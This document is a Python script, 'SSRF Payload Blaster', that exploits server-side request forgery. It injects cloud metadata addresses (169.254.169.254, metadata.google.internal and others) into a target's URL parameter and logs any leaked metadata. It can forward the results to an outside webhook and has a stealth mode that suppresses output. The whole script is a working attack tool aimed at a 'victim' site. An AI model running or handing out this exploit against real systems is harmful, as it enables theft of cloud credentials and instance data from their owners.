

import requests
import argparse
import urllib.parse
import json
import os
from datetime import datetime

METADATA_URLS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
]

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1190"  # SSRF / Initial Access

def log_result(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            existing = json.load(f)
    else:
        existing = []
    existing.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(existing, f, indent=2)

def test_ssrf(target_url, param, stealth=False, webhook=None):
    print("[*] Launching SSRF probe...")
    for meta_url in METADATA_URLS:
        payload = {param: meta_url}
        full_url = target_url + "?" + urllib.parse.urlencode(payload)
        try:
            headers = {"Metadata-Flavor": "Google"} if "google" in meta_url else {}
            r = requests.get(full_url, headers=headers, timeout=4)
            if r.status_code == 200 and len(r.text.strip()) > 0:
                result = {
                    "timestamp": datetime.utcnow().isoformat(),
                    "target": target_url,
                    "type": "ssrf",
                    "meta_url": meta_url,
                    "response_preview": r.text[:120],
                    "ttp": MITRE_TTP
                }
                print(f"[+] SSRF success: {meta_url}")
                print(f"    {r.text[:120]}")
                log_result(result)
                if webhook:
                    try:
                        requests.post(webhook, json=result, timeout=3)
                    except Exception:
                        if not stealth:
                            print("[!] Webhook delivery failed.")
        except Exception as e:
            if not stealth:
                print(f"[-] Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SSRF Payload Blaster - Enhanced")
    parser.add_argument("--url", required=True, help="Target base URL (e.g. http://victim.com/view)")
    parser.add_argument("--param", required=True, help="Parameter to inject (e.g. url, image, target)")
    parser.add_argument("--stealth", action="store_true", help="Suppress errors/output")
    parser.add_argument("--webhook", help="Optional webhook for result forwarding")
    args = parser.parse_args()

    test_ssrf(args.url, args.param, args.stealth, args.webhook)
